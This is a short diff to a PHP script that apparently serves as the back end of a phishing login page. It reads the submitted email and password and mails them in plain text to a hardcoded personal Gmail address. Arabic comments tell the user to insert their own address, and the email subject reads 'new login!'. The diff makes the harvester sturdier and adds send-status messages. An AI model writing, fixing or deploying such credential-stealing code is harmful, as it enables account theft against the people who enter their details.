@@ -1,13 +1,17 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+    $email = isset($_POST['email']) ? $_POST['email'] : '';
+    $password = isset($_POST['password']) ? $_POST['password'] : '';
 
-    $to = "issam.s.g22@gmail.com"; // ضع إيميلك هنا
-    $subject = "بيانات تسجيل الدخول";
+    $to = "issam.s.g22@gmail.com";  // ضع هنا إيميلك الحقيقي
+    $subject = "تسجيل دخول جديد!";
     $message = "الإيميل: " . $email . "\nكلمة المرور: " . $password;
     $headers = "From: no-reply@yourdomain.com";
 
-    mail($to, $subject, $message, $headers);
+    if (mail($to, $subject, $message, $headers)) {
+        echo "تم الإرسال بنجاح!";
+    } else {
+        echo "فشل الإرسال!";
+    }
 }
 ?>
